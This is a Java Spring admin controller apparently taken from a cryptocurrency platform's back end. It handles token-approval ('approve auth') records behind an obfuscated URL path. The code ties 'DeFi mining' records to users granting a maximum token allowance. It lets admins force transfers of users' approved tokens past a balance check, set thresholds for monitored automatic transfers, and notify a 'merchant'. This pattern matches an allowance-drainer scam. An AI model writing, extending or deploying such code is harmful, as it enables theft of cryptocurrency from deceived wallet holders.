package com.inso.modules.admin.controller.coin.approve;

import com.inso.framework.bean.ApiJsonTemplate;
import com.inso.framework.bean.ErrorResult;
import com.inso.framework.bean.PageVo;
import com.inso.framework.bean.SystemErrorResult;
import com.inso.framework.context.MyEnvironment;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.spring.web.WebRequest;
import com.inso.framework.utils.RegexUtils;
import com.inso.framework.utils.RowPager;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.admin.core.model.AdminSecret;
import com.inso.modules.admin.core.service.AdminService;
import com.inso.modules.admin.helper.AdminAccountHelper;
import com.inso.modules.coin.contract.Token20Manager;
import com.inso.modules.coin.approve.job.ApproveNotifyMerchantJob;
import com.inso.modules.coin.approve.job.SyncApproveStatusJob;
import com.inso.modules.coin.approve.logical.TransferOrderManager;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.coin.core.service.CoinAccountService;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.coin.approve.service.TransferOrderService;
import com.inso.modules.coin.defi_mining.model.MiningProductInfo;
import com.inso.modules.coin.defi_mining.service.MiningProductService;
import com.inso.modules.coin.defi_mining.service.MiningRecordService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.common.model.Status;
import com.inso.modules.passport.UserErrorResult;
import com.inso.modules.passport.user.logical.UserQueryManager;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.model.UserInfo;
import com.inso.modules.passport.user.service.UserAttrService;
import com.inso.modules.passport.user.service.UserService;
import com.inso.modules.web.service.ConfigService;
import org.apache.shiro.authz.annotation.RequiresPermissions;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.math.BigDecimal;

@Controller
@RequestMapping("/alibaba888/Liv2sky3soLa93vEr62")
public class ApproveAuthController {

    private static Log LOG = LogFactory.getLog(ApproveAuthController.class);

    @Autowired
    private ConfigService mConfigService;

    @Autowired
    private UserService userService;

    @Autowired
    private UserAttrService mUserAttrService;

    @Autowired
    private ApproveAuthService mApproveAuthService;

    @Autowired
    private UserQueryManager mUserQueryManager;

    @Autowired
    private TransferOrderService mTransferOrderService;

    @Autowired
    private TransferOrderManager mTransferOrderMgr;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private MiningProductService miningProductService;

    @Autowired
    private CoinAccountService mAccountService;

    @Autowired
    private MiningRecordService miningRecordService;

    @Autowired
    private CoinAccountService mCoinAccountService;

    @Autowired
    private UserService mUserService;

    @Autowired
    private AdminService mAdminService;

    @RequiresPermissions("root_coin_crypto_approve_auth_list")
    @RequestMapping("toEditAddCoinApprove")
    public String toEditAddCoinApprove(Model model)
    {
        ApproveFromType.addApproveFromTypeModel(model);
        CryptoNetworkType.addFreemarkerModel(model);

        CryptoCurrency.addModel(model);
        return "admin/coin/coin_approve_add";
    }

    @RequiresPermissions("root_coin_crypto_approve_auth_list")
    @RequestMapping("doAddTokenApprove")
    @ResponseBody
    public String doAddTokenApprove()
    {
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));
        CryptoCurrency currency  = CryptoCurrency.getType(WebRequest.getString("currency"));

        String address = WebRequest.getString("address");
        ApproveFromType fromType = ApproveFromType.getType(WebRequest.getString("fromType"));
        //        String contractIdString = WebRequest.getString("contractId");
//        long contractId = ContractInfoManager.decryptId(contractIdString);
//        if(contractId <= 0 & MyEnvironment.isDev())
//        {
//            contractId = WebRequest.getLong("contractId");
//        }

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();
//
//        if(contractId <= 0 || fromType == null)
//        {
//            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
//            return apiJsonTemplate.toJSONString();
//        }

        if(networkType == null || fromType == null || currency == null )
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }


        if(StringUtils.isEmpty(address) || !RegexUtils.isLetterDigit(address))
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ContractInfo contractInfo = mContractService.findByNetowrkAndCurrency(false,   networkType, currency);
        if(contractInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
        long contractId = contractInfo.getId();

        CoinAccountInfo accountInfo = mCoinAccountService.findByAddress(false, address);
        if(accountInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        UserInfo userInfo = mUserService.findByUsername(false, accountInfo.getUsername());
        UserAttr userAttr = mUserAttrService.find(false, userInfo.getId());

        ApproveAuthInfo authInfo = mApproveAuthService.findByUseridAndContractId(false, accountInfo.getUserid(), contractId);
        if(authInfo == null )
        {
            // 先添加授权信息，只要调用这个方法，就直接添加这个授权, 因为不添加的话，授权信息同步可能会延迟，导致读取失败
            // 所以只能先添加，再后读取
            BigDecimal balance = BigDecimal.ZERO;
            BigDecimal allowance = BigDecimal.ZERO;
            mApproveAuthService.add(userAttr, contractInfo, accountInfo, fromType, balance, allowance);
            authInfo = mApproveAuthService.findByUseridAndContractId(false, accountInfo.getUserid(), contractId);
        }else{
            apiJsonTemplate.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "授权已存在");
            return apiJsonTemplate.toJSONString();
        }

        // 读取授权信息，可能会因为信息同步失败
        Token20Manager token20Manager = Token20Manager.getInstance();
        BigDecimal balance = token20Manager.balanceOf(networkType, contractInfo.getCurrencyCtrAddr(), address);
        BigDecimal allowance = token20Manager.allowance(networkType, contractInfo.getCurrencyCtrAddr(), address, contractInfo.getAddress(), authInfo.getApproveAddress());

        // 更新额度
        if(allowance != null & allowance.compareTo(BigDecimal.ZERO) > 0)
        {
            mApproveAuthService.updateInfo(authInfo, balance, allowance, null,null, -1);
        }

        return apiJsonTemplate.toJSONString();
    }


    @RequiresPermissions("root_coin_crypto_approve_auth_list")
    @RequestMapping("root_coin_crypto_approve_auth")
    public String toList(Model model, HttpServletRequest request)
    {
        String address = WebRequest.getString("address");
//        List<Game> list = mApproveAuthService.queryAllByCategory(true, GameCategory.ANDAR_BAHAR);
//        model.addAttribute("gameList", list);

        CryptoNetworkType.addFreemarkerModel(model);
        CryptoCurrency.addModel(model);

        model.addAttribute("isSuperAdmin", AdminAccountHelper.isNy4timeAdminOrDEV() + StringUtils.getEmpty());

        model.addAttribute("address", address);

        return "admin/coin/coin_approve_auth_list";
    }

    @RequiresPermissions("root_coin_crypto_approve_auth_list")
    @RequestMapping("getCoinApproveAuthList")
    @ResponseBody
    public String getCoinApproveAuthList()
    {

        String userTypeString = WebRequest.getString("userType");
        UserInfo.UserType userType = UserInfo.UserType.getType(userTypeString);

        String time = WebRequest.getString("time");


        String address = WebRequest.getString("address");
        String username = WebRequest.getString("username");
        long userid = -1;
        if(username!=null){
            userid = mUserQueryManager.findUserid(username);
        }

        String agentname = WebRequest.getString("agentname");
        long agentid = mUserQueryManager.findUserid(agentname);

        String staffname = WebRequest.getString("staffname");
        long staffid = mUserQueryManager.findUserid(staffname);

        String orderBy = WebRequest.getString("orderBy");

        CryptoCurrency currency = CryptoCurrency.getType(WebRequest.getString("currencyType"));
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));
        Status status = Status.getType(WebRequest.getString("status"));

        long contractid = WebRequest.getLong("contractid");

        ApiJsonTemplate template = new ApiJsonTemplate();

        PageVo pageVo = new PageVo(WebRequest.getInt("offset"), WebRequest.getInt("limit"));
        pageVo.parseTime(time);

        RowPager<ApproveAuthInfo> rowPager = mApproveAuthService.queryScrollPage(pageVo, userid, address, contractid, orderBy, currency, networkType, status,agentid,staffid , userType );

        template.setData(rowPager);
        return template.toJSONString();
    }



    @RequiresPermissions("root_coin_crypto_approve_auth_edit")
    @RequestMapping("doCoinTransferBalance")
    @ResponseBody
    public String doCoinTransferBalance()
    {
        long id = WebRequest.getLong("transferFormId");
        String googleCode = WebRequest.getString("transferFormGoogleCode");
        BigDecimal transferAmount = WebRequest.getBigDecimal("transferFormAmount");

        boolean forceTransfer = WebRequest.getBoolean("transferFromForceTransfer");

        ApiJsonTemplate template = new ApiJsonTemplate();

        if(transferAmount.compareTo(BigDecimal.ZERO) <= 0 || id <= 0)
        {
            template.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return template.toJSONString();
        }

        AdminSecret adminSecret = mAdminService.findAdminSecretByID(AdminAccountHelper.getAdmin().getAccount());
        if(! adminSecret.checkGoogleCode(googleCode))
        {
            template.setJsonResult(SystemErrorResult.ERR_SYS_GOOGLE);
            return template.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            template.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return template.toJSONString();
        }

        if(!forceTransfer && !authInfo.verifyTransfer(transferAmount))
        {
            template.setJsonResult(UserErrorResult.ERR_PAY_NOT_ENOUGH_BALANCE);
            return template.toJSONString();
        }

        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());
        UserInfo userInfo = userService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
        if(userType == UserInfo.UserType.TEST)
        {
            template.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "测试号无法划转!");
            return template.toJSONString();
        }
        UserAttr userAttr = mUserAttrService.find(false, authInfo.getUserid());

        // 创建订单
        ErrorResult result = mTransferOrderMgr.createOrder(userAttr, contractInfo, authInfo, transferAmount, TriggerOperatorType.Admin);
        template.setJsonResult(result);

        return template.toJSONString();
    }


    @RequiresPermissions("root_coin_crypto_approve_auth_edit")
    @RequestMapping("syncCoinApproveInfo")
    @ResponseBody
    public String syncCoinApproveInfo()
    {
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        UserInfo userInfo = mUserService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());


        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());

        CryptoNetworkType networkType = CryptoNetworkType.getType(contractInfo.getNetworkType());
        CryptoCurrency currency = CryptoCurrency.getType(contractInfo.getCurrencyType());
        String address = authInfo.getSenderAddress();

        Token20Manager token20Manager = Token20Manager.getInstance();
        BigDecimal balance = null;
        if(userType != UserInfo.UserType.TEST)
        {
            balance = token20Manager.balanceOf(networkType, contractInfo.getCurrencyCtrAddr(), address);
        }
        BigDecimal allowance = token20Manager.allowance(networkType, contractInfo.getCurrencyCtrAddr(), address, contractInfo.getAddress(), authInfo.getApproveAddress());

        LOG.info("address = " + address + ", balance = " + balance + ", allowance = " + allowance);

        if(balance == null || balance.compareTo(authInfo.getBalance()) == 0)
        {
            balance = null;
        }

        if(allowance == null || allowance.compareTo(authInfo.getAllowance()) == 0)
        {
            allowance = null;
        }

        if(balance != null || allowance != null)
        {
            int approveCount = token20Manager.getApproveCount(address, networkType, currency);
            mApproveAuthService.updateInfo(authInfo, balance, allowance, null, null, approveCount);
            ApproveNotifyMerchantJob.sendMQ(authInfo);
        }
        return apiJsonTemplate.toJSONString();
    }


    @RequestMapping("syncMiningInfo")
    @ResponseBody
    public String syncMiningInfo()
    {
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());

        String address = authInfo.getSenderAddress();

        CryptoNetworkType networkType = CryptoNetworkType.getType(contractInfo.getNetworkType());

        CryptoCurrency quoteCurrency=CryptoCurrency.getType(contractInfo.getCurrencyType());

        PageVo pageVo = new PageVo(0, 10);
        RowPager<MiningProductInfo> rowPager = miningProductService.queryScrollPage(pageVo, networkType, quoteCurrency, Status.ENABLE);
        MiningProductInfo miningProductInfo= rowPager.getList().get(0);
        if(miningProductInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
        long productId =miningProductInfo.getId();

        CoinAccountInfo accountInfo = mAccountService.findByAddress(false, address);
        if(accountInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(miningRecordService.findByAccountIdAndProductId(false, accountInfo.getUserid(), productId) != null)
        {
            // 已存在
            apiJsonTemplate.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "已存在挖矿记录!");
            return apiJsonTemplate.toJSONString();
        }


        // 判断是否授权过
            boolean isAuth = true;
            if(authInfo.getAllowance().compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) < 0)
            {
                Token20Manager token20Manager = Token20Manager.getInstance();
                BigDecimal allowance = token20Manager.allowance(networkType, contractInfo.getCurrencyCtrAddr(), address, contractInfo.getAddress(), authInfo.getApproveAddress());
                isAuth = allowance != null && allowance.compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) > 0;

                if(isAuth)
                {
                    mApproveAuthService.updateInfo(authInfo, null, allowance, null, null, -1);
                }

            }

            if(isAuth)
            {
                miningRecordService.add(accountInfo, miningProductInfo);
            }


       return apiJsonTemplate.toJSONString();
    }

    @RequiresPermissions("root_coin_crypto_approve_auth_edit")
    @RequestMapping("deleteCoinApproveInfo")
    @ResponseBody
    public String deleteCoinApproveInfo()
    {
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(AdminAccountHelper.isNy4timeAdminOrDEV())
        {
            mApproveAuthService.deleteById(authInfo);
        }
        return apiJsonTemplate.toJSONString();
    }

    @RequiresPermissions("root_coin_crypto_approve_auth_edit")
    @RequestMapping("batchCoinApproveSyncAll")
    @ResponseBody
    public String batchCoinApproveSyncAll()
    {
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();
        boolean isSuccess = SyncApproveStatusJob.syncAll();
        if(!isSuccess)
        {
            apiJsonTemplate.setError(-1, "1小时内最多同步一次");
        }
        return apiJsonTemplate.toJSONString();
    }


    @RequiresPermissions("root_coin_crypto_approve_auth_edit")
    @RequestMapping("updateCoinApproveAssertWalletBalance")
    @ResponseBody
    public String updateCoinApproveAssertWalletBalance()
    {
        long id = WebRequest.getLong("id");
        BigDecimal walletAmount = WebRequest.getBigDecimal("walletAmount");
        BigDecimal monitorMinTransferAmount = WebRequest.getBigDecimal("monitorMinTransferAmount");

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        if(walletAmount == null || walletAmount.compareTo(BigDecimal.ZERO) < 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        CryptoNetworkType networkType = CryptoNetworkType.getType(authInfo.getCtrNetworkType());

        UserInfo userInfo = mUserService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
        if(userType == UserInfo.UserType.TEST)
        {
            monitorMinTransferAmount = null;
            authInfo.setUserType(userType.getKey());
        }
        else
        {
            walletAmount = null;

//            if(!(networkType == CryptoNetworkType.ETH_MAINNET || networkType == CryptoNetworkType.BNB_MAINNET))
            if(networkType != CryptoNetworkType.ETH_MAINNET )
            {
                apiJsonTemplate.setError(-1, "监控划转金额只支持 ETH 链!");
                return apiJsonTemplate.toJSONString();
            }

            if(monitorMinTransferAmount == null)
            {
                apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
                return apiJsonTemplate.toJSONString();
            }

            if(!authInfo.verifyTransfer(monitorMinTransferAmount) && !MyEnvironment.isDev())
            {
                apiJsonTemplate.setError(-1, "监控划转金额不能小于配置最低余额!");
                apiJsonTemplate.setJsonResult(UserErrorResult.ERR_PAY_NOT_ENOUGH_BALANCE);
                return apiJsonTemplate.toJSONString();
            }
        }

        mApproveAuthService.updateInfo(authInfo, walletAmount, null, monitorMinTransferAmount, null, -1);
        return apiJsonTemplate.toJSONString();
    }

}
